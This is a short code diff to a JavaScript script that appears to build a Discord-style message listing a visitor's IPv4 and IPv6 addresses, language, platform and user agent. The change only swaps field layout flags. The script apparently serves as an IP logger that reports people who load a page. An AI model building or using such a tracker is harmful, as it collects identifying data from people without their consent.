@@ -49,9 +49,9 @@
                     color: CONFIG.EMBED_COLOR,
                     timestamp: now.toISOString(),
                     fields: [
-                        { name: "IPv4 Address", value: `\`${ipv4}\``, inline: true },
-                        { name: "IPv6 Address", value: `\`${ipv6}\``, inline: true },
-                        { name: "Language / Region", value: `\`${navigator.language}\``, inline: false },
+                        { name: "IPv4 Address", value: `\`${ipv4}\``, inline: false },
+                        { name: "IPv6 Address", value: `\`${ipv6}\``, inline: false },
+                        { name: "Language / Region", value: `\`${navigator.language}\``, inline: true },
                         { name: "Platform", value: `\`${navigator.platform}\``, inline: true },
                         { name: "User Agent", value: `\`${navigator.userAgent}\``, inline: false }
                     ],
